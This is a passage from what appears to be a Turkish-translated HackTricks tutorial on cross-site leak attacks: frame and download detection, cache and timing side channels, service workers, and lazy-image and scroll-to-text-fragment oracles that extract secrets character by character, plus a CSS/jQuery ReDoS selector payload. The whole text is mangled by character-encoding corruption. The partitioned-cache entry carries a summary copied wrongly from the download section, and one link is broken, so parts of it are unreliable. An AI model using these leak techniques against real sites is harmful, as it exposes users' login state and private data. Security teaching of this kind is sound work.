* **Ã–zet**: Google Chrome'da, X-Frame-Options kÄ±sÄ±tlamalarÄ± nedeniyle Ã§apraz kaynak siteye gÃ¶mÃ¼lmesi engellenen bir sayfa iÃ§in Ã¶zel bir hata sayfasÄ± gÃ¶rÃ¼ntÃ¼lenir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, "X-Frame-Options" baÅŸlÄ±ÄŸÄ± "deny" veya "same-origin" olarak ayarlanmÄ±ÅŸ bir sayfa bir nesne olarak gÃ¶mÃ¼lÃ¼yorsa, bir hata sayfasÄ± gÃ¶rÃ¼nÃ¼r. Chrome, bu nesnenin `contentDocument` Ã¶zelliÄŸi iÃ§in diÄŸer iframe'ler veya diÄŸer tarayÄ±cÄ±lardan farklÄ± olarak boÅŸ bir belge nesnesi (null yerine) dÃ¶ndÃ¼rÃ¼r. SaldÄ±rganlar, boÅŸ belgeyi algÄ±layarak, geliÅŸtiricilerin X-Frame-Options baÅŸlÄ±ÄŸÄ±nÄ± tutarsÄ±z bir ÅŸekilde ayarlamasÄ± durumunda (hata sayfalarÄ±nÄ± genellikle gÃ¶z ardÄ± ederek), kullanÄ±cÄ±nÄ±n durumu hakkÄ±nda bilgi ortaya Ã§Ä±karabilir. Bu tÃ¼r sÄ±zÄ±ntÄ±larÄ± Ã¶nlemek iÃ§in gÃ¼venlik baÅŸlÄ±klarÄ±nÄ±n farkÄ±nda olunmasÄ± ve tutarlÄ± bir ÅŸekilde uygulanmasÄ± Ã¶nemlidir.


### Ä°ndirme AlgÄ±lama

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Ã–zet**: Bir saldÄ±rgan, iframe'leri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframe'in sÃ¼rekli eriÅŸilebilir olmasÄ±, baÅŸarÄ±lÄ± bir dosya indirmesini ima eder.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` baÅŸlÄ±ÄŸÄ±, Ã¶zellikle `Content-Disposition: attachment`, tarayÄ±cÄ±ya iÃ§eriÄŸi iÃ§e aktarmak yerine indirmesini talimat verir. Bu davranÄ±ÅŸ, bir kullanÄ±cÄ±nÄ±n bir dosya indirme tetikleyen bir sayfaya eriÅŸiminin olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in istismar edilebilir. Chromium tabanlÄ± tarayÄ±cÄ±larda, bu indirme davranÄ±ÅŸÄ±nÄ± tespit etmek iÃ§in birkaÃ§ teknik bulunmaktadÄ±r:

1. **Ä°ndirme Ã‡ubuÄŸu Ä°zleme**:
- Chromium tabanlÄ± tarayÄ±cÄ±larda bir dosya indirildiÄŸinde, tarayÄ±cÄ±nÄ±n altÄ±nda bir indirme Ã§ubuÄŸu gÃ¶rÃ¼nÃ¼r.
- SaldÄ±rganlar, pencere yÃ¼ksekliÄŸindeki deÄŸiÅŸiklikleri izleyerek indirme Ã§ubuÄŸunun gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ Ã§Ä±karabilir ve bir indirme baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± ima edebilir.

2. **Iframe ile Ä°ndirme Gezinmesi**:
- Bir sayfa, `Content-Disposition: attachment` baÅŸlÄ±ÄŸÄ±nÄ± kullanarak bir dosya indirmesini tetiklediÄŸinde, bir gezinme olayÄ±na neden olmaz.
- Ä°Ã§eriÄŸi bir iframe iÃ§inde yÃ¼kleyerek ve gezinme olaylarÄ±nÄ± izleyerek, iÃ§erik dÃ¼zeninin bir dosya indirmesine neden olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r (gezinme olmaz).

3. **Iframe Olmadan Ä°ndirme Gezinmesi**:
- Iframe tekniÄŸiyle benzer ÅŸekilde, bu yÃ¶ntem bir iframe yerine `window.open` kullanmayÄ± iÃ§erir.
- Yeni aÃ§Ä±lan penceredeki gezinme olaylarÄ±nÄ± izleyerek, bir dosya indirilip indirilmediÄŸi (gezinme olmaz) veya iÃ§eriÄŸin iÃ§e aktarÄ±ldÄ±ÄŸÄ± (gezinme gerÃ§ekleÅŸir) ortaya Ã§Ä±karÄ±labilir.

YalnÄ±zca oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ±n bÃ¶yle indirmeleri tetikleyebildiÄŸi senaryolarda, bu teknikler, tarayÄ±cÄ±nÄ±n indirme isteÄŸine verdiÄŸi yanÄ±ta dayanarak dolaylÄ± olarak kullanÄ±cÄ±nÄ±n kimlik doÄŸrulama durumunu Ã§Ä±karabilmek iÃ§in kullanÄ±labilir.

### BÃ¶lÃ¼mlenmiÅŸ HTTP Ã–nbelleÄŸi Atlama <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Zamanlama
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Ã–zet**: Bir saldÄ±rgan, iframe'leri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframe'in sÃ¼rekli eriÅŸilebilir olmasÄ±, baÅŸarÄ±lÄ± bir dosya indirmesini ima eder.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (kaynak: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu teknik neden ilginÃ§: Chrome ÅŸimdi **Ã¶nbelleÄŸi bÃ¶lmektedir** ve yeni aÃ§Ä±lan sayfanÄ±n Ã¶nbellek anahtarÄ± ÅŸudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ancak bir ngrok sayfasÄ± aÃ§arsam ve iÃ§inde fetch kullanÄ±rsam, Ã¶nbellek anahtarÄ± ÅŸu ÅŸekilde olacaktÄ±r: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **Ã¶nbellek anahtarÄ± farklÄ±dÄ±r**, bu nedenle Ã¶nbellek paylaÅŸÄ±lamaz. Daha fazla ayrÄ±ntÄ±yÄ± burada bulabilirsiniz: [Ã–nbelleÄŸi bÃ¶lmekle gÃ¼venlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

EÄŸer bir site `example.com`, `*.example.com/resource` kaynaÄŸÄ±nÄ± iÃ§eriyorsa, o kaynak, kaynaÄŸÄ±n doÄŸrudan **Ã¼st dÃ¼zey gezinme** ile istendiÄŸi gibi **aynÄ± Ã¶nbellekleme anahtarÄ±na** sahip olacaktÄ±r. Ã‡Ã¼nkÃ¼ Ã¶nbelleÄŸe eriÅŸmek, bir kaynaÄŸÄ± yÃ¼klemekten daha hÄ±zlÄ±dÄ±r, bu nedenle bir sayfanÄ±n konumunu deÄŸiÅŸtirmeye ve durduktan 20ms sonra iptal etmeye Ã§alÄ±ÅŸmak mÃ¼mkÃ¼ndÃ¼r. EÄŸer durduktan sonra kÃ¶ken deÄŸiÅŸtiyse, kaynaÄŸÄ±n Ã¶nbelleklendiÄŸi anlamÄ±na gelir.\
Veya sadece **potansiyel olarak Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ sayfaya bazÄ± fetch istekleri gÃ¶nderip, alÄ±nan zamanÄ± Ã¶lÃ§ebilirsiniz**.

### Manuel YÃ¶nlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirmeler
* **Daha fazla bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
*
### Script KirliliÄŸi

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ± (script)
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Ã–zet:** Dahili fonksiyonlarÄ± **Ã¼zerine yazmak** ve hatta **Ã§apraz kaynaklÄ± betikten** (doÄŸrudan okunamayan) argÃ¼manlarÄ±nÄ± okumak mÃ¼mkÃ¼ndÃ¼r, bu deÄŸerli bilgilerin **sÄ±zmasÄ±na** neden olabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet Ä°ÅŸÃ§ileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Ã–zet:** Bir web sitesinin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§mek iÃ§in hizmet iÅŸÃ§ileri kullanÄ±lÄ±r.
* **Kod Ã–rneÄŸi**:

Verilen senaryoda saldÄ±rgan, "attacker.com" adlÄ± bir alan adÄ±nda bir **hizmet iÅŸÃ§isi** kaydeder. ArdÄ±ndan, saldÄ±rgan hedef web sitesindeki ana belgeden yeni bir pencere aÃ§ar ve **hizmet iÅŸÃ§isine** bir zamanlayÄ±cÄ± baÅŸlatmasÄ±nÄ± sÃ¶yler. Yeni pencere yÃ¼klenmeye baÅŸladÄ±ÄŸÄ±nda, saldÄ±rgan Ã¶nceki adÄ±mda elde edilen referansÄ± **hizmet iÅŸÃ§isi** tarafÄ±ndan yÃ¶netilen bir sayfaya yÃ¶nlendirir.

Ã–nceki adÄ±mda baÅŸlatÄ±lan isteÄŸin varÄ±ÅŸÄ±nda, **hizmet iÅŸÃ§isi** etkin bir ÅŸekilde gezinme sÃ¼recini sonlandÄ±ran bir **204 (Ä°Ã§erik Yok)** durum koduyla yanÄ±t verir. Bu noktada, **hizmet iÅŸÃ§isi** Ã¶nceki adÄ±mda baÅŸlatÄ±lan zamanlayÄ±cÄ±dan bir Ã¶lÃ§Ã¼m yakalar. Bu Ã¶lÃ§Ã¼m, gezinme sÃ¼recinde gecikmelere neden olan JavaScript'in sÃ¼resinden etkilenir.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** ve **daha kesin Ã¶lÃ§Ã¼mler** elde etmek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfanÄ±n yÃ¼klenmeden Ã¶nce kullandÄ±ÄŸÄ± kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### Fetch ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Ã–zet:** Bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in geÃ§en sÃ¼reyi Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±lÄ±r. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Ã‡apraz Pencere ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Ã–zet:** `window.open` kullanarak bir isteÄŸin gerÃ§ekleÅŸtirilmesi iÃ§in geÃ§en sÃ¼reyi Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±lÄ±r. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen ve **iÅŸ akÄ±ÅŸlarÄ±nÄ± otomatikleÅŸtirmenize** olanak saÄŸlayan [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Re Enjeksiyonu ile

Burada, Ã§apraz kaynaklÄ± bir HTML'den bilgi Ã§almak iÃ§in **HTML iÃ§eriÄŸi enjekte eden teknikleri** bulabilirsiniz. Bu teknikler, herhangi bir nedenle **JS kodu enjekte edememeniz** durumunda ilginÃ§ olabilir.

### Sarkan Ä°ÅŸaretleme

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### GÃ¶rÃ¼ntÃ¼ Tembel YÃ¼kleme

Ä°Ã§eriÄŸi **Ã§almak** ve gizli bilgiden Ã¶nce **HTML ekleyebiliyorsanÄ±z**, **sarkan iÅŸaretleme tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenden dolayÄ± **her karakteri ayrÄ± ayrÄ±** yapmanÄ±z gerekiyorsa (belki iletiÅŸim Ã¶nbellek vuruÅŸuyla gerÃ§ekleÅŸiyorsa) bu hileyi kullanabilirsiniz.

HTML'deki **gÃ¶rÃ¼ntÃ¼lerin** bir "**yÃ¼kleme**" Ã¶zniteliÄŸi vardÄ±r ve deÄŸeri "**lazy**" olabilir. Bu durumda, gÃ¶rÃ¼ntÃ¼ yalnÄ±zca gÃ¶rÃ¼ntÃ¼lendiÄŸinde yÃ¼klenir ve sayfa yÃ¼klenirken deÄŸil:
```html
<img src=/something loading=lazy >
```
Bu nedenle yapabileceÄŸiniz ÅŸey, gizli olanÄ±n Ã¶nÃ¼ne **Ã§ok fazla gereksiz karakter eklemek** (Ã–rneÄŸin **binlerce "W"**) veya `<br><canvas height="1850px"></canvas><br>` gibi bir ÅŸey eklemektir.\
Ã–yleyse Ã¶rneÄŸin **enjeksiyonumuz bayraÄŸÄ±n Ã¶nÃ¼nde gÃ¶rÃ¼nÃ¼yorsa**, **resim yÃ¼klenecektir**, ancak bayraktan sonra gÃ¶rÃ¼nÃ¼yorsa bayrak + gereksiz karakterler **yÃ¼kleme iÅŸlemini engelleyecektir** (ne kadar gereksiz karakter yerleÅŸtireceÄŸinizle oynamanÄ±z gerekecektir). Bu, [**bu yazÄ±da**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan ÅŸeydir.

BaÅŸka bir seÃ§enek ise, izin veriliyorsa **scroll-to-text-fragment** kullanmaktÄ±r:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya eriÅŸmesini saÄŸlarsÄ±nÄ±z** ve bunu ÅŸu ÅŸekilde yaparsÄ±nÄ±z:
```
#:~:text=SECR
```
Web sayfasÄ± ÅŸuna benzer olacak: **`https://victim.com/post.html#:~:text=SECR`**

Post.html, saldÄ±rganÄ±n gereksiz karakterlerini ve tembel yÃ¼kleme resmini iÃ§erir ve ardÄ±ndan botun sÄ±rrÄ± eklenir.

Bu metin, botun, sayfadaki `SECR` metnini iÃ§eren herhangi bir metne eriÅŸmesini saÄŸlar. Bu metin sÄ±r olduÄŸu iÃ§in ve sadece **resmin altÄ±nda** olduÄŸu iÃ§in, **resim yalnÄ±zca tahmin edilen sÄ±r doÄŸruysa yÃ¼klenecektir**. BÃ¶ylece, karakter karakter sÄ±rrÄ± **dÄ±ÅŸarÄ± sÄ±zdÄ±rmanÄ±zÄ± saÄŸlayacak bir oracle** elde edersiniz.

Bunu sÃ¶mÃ¼rmek iÃ§in bazÄ± kod Ã¶rnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Gecikmeli Resim YÃ¼kleme ZamanÄ±na DayalÄ± SaldÄ±rÄ±

EÄŸer **dÄ±ÅŸarÄ±dan bir resim yÃ¼klemek mÃ¼mkÃ¼n deÄŸilse** ve bu, saldÄ±rganÄ±n resmin yÃ¼klendiÄŸini gÃ¶stermesi gerekiyorsa, baÅŸka bir seÃ§enek de **karakteri birkaÃ§ kez tahmin etmek ve bunu Ã¶lÃ§mektir**. EÄŸer resim yÃ¼klenirse, tÃ¼m istekler yÃ¼klenmezse daha uzun sÃ¼recektir. Bu, [**bu Ã§Ã¶zÃ¼mde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) kullanÄ±lan ÅŸeydir.

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

EÄŸer `jQuery(location.hash)` kullanÄ±lÄ±yorsa, bazÄ± HTML iÃ§eriÄŸinin var olup olmadÄ±ÄŸÄ±nÄ± zamanlama ile bulmak mÃ¼mkÃ¼ndÃ¼r. Bu, `main[id='site-main']` seÃ§icisi eÅŸleÅŸmiyorsa, geri kalan **seÃ§icileri kontrol etmesine gerek olmadÄ±ÄŸÄ±** iÃ§in bÃ¶yledir.
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Enjeksiyonu

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde Ã¶nerilen Ã¶nlemler bulunmaktadÄ±r. AyrÄ±ca [https://xsleaks.dev/](https://xsleaks.dev/) adresindeki her bÃ¶lÃ¼mde de bu tekniklere karÅŸÄ± nasÄ±l korunulacaÄŸÄ± hakkÄ±nda daha fazla bilgi bulabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturup otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
